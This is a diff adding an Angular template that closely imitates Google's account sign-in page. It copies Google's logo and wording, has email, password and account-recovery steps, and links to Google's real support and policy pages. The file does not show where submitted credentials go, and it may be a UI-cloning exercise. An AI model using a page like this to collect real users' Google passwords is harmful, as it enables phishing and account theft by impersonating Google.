@@ -1,0 +1,199 @@
+<div class="auth-container">
+  <div class="auth-card">
+    
+    <div class="card-left">
+      <div class="google-logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.9c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+      </div>
+      <h1 class="auth-title" *ngIf="currentStep === 1">Sign in</h1>
+      <p class="auth-subtitle" *ngIf="currentStep === 1">with your Google Account. This account will be available to other Google apps in the browser.</p>
+
+      <h1 class="auth-title" *ngIf="currentStep === 2">Welcome</h1>
+      <div class="user-chip" *ngIf="currentStep === 2" (click)="currentStep = 1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+        </svg>
+        <span class="user-chip-text">{{ loginForm.get('email')?.value || 'user@example.com' }}</span>
+        <mat-icon>expand_more</mat-icon>
+      </div>
+
+      <h1 class="auth-title" *ngIf="currentStep === 3">Find your email</h1>
+      <p class="auth-subtitle" *ngIf="currentStep === 3">Enter your phone number or recovery email</p>
+
+      <h1 class="auth-title" *ngIf="currentStep === 4">What's your name?</h1>
+      <p class="auth-subtitle" *ngIf="currentStep === 4">Enter the name on your Google Account</p>
+
+      <h1 class="auth-title" *ngIf="currentStep === 5">No account found</h1>
+      <p class="auth-subtitle" *ngIf="currentStep === 5">There's no Google Account with the info that you provided.</p>
+    </div>
+
+    <div class="card-right">
+      <form [formGroup]="loginForm" (ngSubmit)="onSubmit()" class="auth-form">
+        
+        <!-- Step 1: Email -->
+        <ng-container *ngIf="currentStep === 1">
+          <div class="input-container">
+            <mat-form-field appearance="outline" class="full-width custom-input" hideRequiredMarker>
+              <mat-label>Email or phone</mat-label>
+              <input matInput formControlName="email" type="email" autocomplete="email" required>
+              <mat-error *ngIf="loginForm.get('email')?.hasError('required') || emailError">Enter an email or phone number</mat-error>
+              <mat-error *ngIf="loginForm.get('email')?.hasError('email') && !emailError">Enter a valid email or phone number</mat-error>
+            </mat-form-field>
+            
+            <div class="forgot-link">
+              <a href="javascript:void(0)" (click)="goToForgotEmail()">Forgot email?</a>
+            </div>
+          </div>
+
+          <div class="guest-text">
+            Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank">Learn more about using Guest mode</a>
+          </div>
+
+          <div class="auth-actions">
+            <button mat-button class="create-account-button" type="button" [matMenuTriggerFor]="createAccountMenu">
+              Create account
+            </button>
+            <mat-menu #createAccountMenu="matMenu">
+              <button mat-menu-item routerLink="/register">For my personal use</button>
+              <button mat-menu-item routerLink="/register">For my child</button>
+              <button mat-menu-item routerLink="/register">For work or my business</button>
+            </mat-menu>
+            <button mat-button class="next-button" type="button" (click)="nextStep()">
+              Next
+            </button>
+          </div>
+        </ng-container>
+
+        <!-- Step 2: Password -->
+        <ng-container *ngIf="currentStep === 2">
+          <div class="input-container">
+            <mat-form-field appearance="outline" class="full-width custom-input" hideRequiredMarker>
+              <mat-label>Enter your password</mat-label>
+              <input matInput formControlName="password" [type]="hidePassword ? 'password' : 'text'" autocomplete="current-password" required>
+              <mat-error *ngIf="loginForm.get('password')?.hasError('required')">Enter a password</mat-error>
+            </mat-form-field>
+            
+            <mat-checkbox class="show-password-checkbox" style="margin-top: 8px;" (change)="hidePassword = !$event.checked">
+              Show password
+            </mat-checkbox>
+          </div>
+
+          <div class="error-message" *ngIf="errorMessage">
+            <svg class="error-icon" viewBox="0 0 24 24" fill="#d93025">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+            </svg>
+            {{ errorMessage }}
+          </div>
+
+          <div class="auth-actions" style="margin-top: auto;">
+            <div class="left-actions">
+              <button mat-button class="create-account-button" type="button" style="padding: 0 16px; border-radius: 20px; color: #0b57d0; font-weight: 500;">
+                Try another way
+              </button>
+            </div>
+            <div class="right-actions">
+              <button mat-button class="next-button" type="submit" [disabled]="loginForm.invalid || isLoading">
+                <span *ngIf="!isLoading">Next</span>
+                <mat-spinner diameter="20" *ngIf="isLoading"></mat-spinner>
+              </button>
+            </div>
+          </div>
+        </ng-container>
+
+        <!-- Step 3: Find Email -->
+        <ng-container *ngIf="currentStep === 3">
+          <div class="input-container" [formGroup]="forgotEmailForm">
+            <mat-form-field appearance="outline" class="full-width custom-input" hideRequiredMarker>
+              <mat-label>Phone number or email</mat-label>
+              <input matInput formControlName="recoveryEmail" required>
+              <mat-error *ngIf="forgotEmailForm.get('recoveryEmail')?.hasError('required')">Enter a valid email or phone number</mat-error>
+            </mat-form-field>
+          </div>
+
+          <div class="auth-actions" style="margin-top: auto;">
+            <div class="left-actions">
+            </div>
+            <div class="right-actions" style="display: flex; justify-content: flex-end; width: 100%;">
+              <button mat-button class="next-button" type="button" (click)="nextStep()">
+                Next
+              </button>
+            </div>
+          </div>
+        </ng-container>
+
+        <!-- Step 4: Find Name -->
+        <ng-container *ngIf="currentStep === 4">
+          <div class="input-container" [formGroup]="forgotNameForm" style="display: flex; flex-direction: column; gap: 12px;">
+            <mat-form-field appearance="outline" class="full-width custom-input" hideRequiredMarker>
+              <mat-label>First name</mat-label>
+              <input matInput formControlName="firstName" required>
+              <mat-error *ngIf="forgotNameForm.get('firstName')?.hasError('required')">Enter your first name</mat-error>
+            </mat-form-field>
+
+            <mat-form-field appearance="outline" class="full-width custom-input" hideRequiredMarker>
+              <mat-label>Surname (optional)</mat-label>
+              <input matInput formControlName="lastName">
+            </mat-form-field>
+          </div>
+
+          <div class="auth-actions" style="margin-top: auto;">
+            <div class="left-actions">
+            </div>
+            <div class="right-actions" style="display: flex; justify-content: flex-end; width: 100%;">
+              <button mat-button class="next-button" type="button" (click)="nextStep()">
+                Next
+              </button>
+            </div>
+          </div>
+        </ng-container>
+
+        <!-- Step 5: No Account Found -->
+        <ng-container *ngIf="currentStep === 5">
+          <div class="auth-actions" style="margin-top: auto; padding-top: 32px;">
+            <div class="left-actions">
+            </div>
+            <div class="right-actions" style="display: flex; justify-content: flex-end; width: 100%;">
+              <button mat-button class="next-button" type="button" (click)="prevStep()">
+                Try again
+              </button>
+            </div>
+          </div>
+        </ng-container>
+
+      </form>
+    </div>
+  </div>
+
+  <div class="auth-footer">
+    <div class="footer-left">
+      <div class="custom-select-wrapper">
+        <select class="footer-select" [value]="'en-US'">
+          <option value="af">Afrikaans</option>
+          <option value="az">azərbaycan</option>
+          <option value="bs">bosanski</option>
+          <option value="ca">català</option>
+          <option value="cs">Čeština</option>
+          <option value="cy">Cymraeg</option>
+          <option value="da">Dansk</option>
+          <option value="de">Deutsch</option>
+          <option value="et">eesti</option>
+          <option value="en-GB">English (United Kingdom)</option>
+          <option value="en-US">English (United States)</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+        </select>
+        <svg class="select-arrow" focusable="false" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
+      </div>
+    </div>
+    <div class="footer-right">
+      <a href="https://support.google.com/accounts?hl=en-US" target="_blank">Help</a>
+      <a href="https://policies.google.com/privacy?hl=en-US" target="_blank">Privacy</a>
+      <a href="https://policies.google.com/terms?hl=en-US" target="_blank">Terms</a>
+    </div>
+  </div>
+</div>
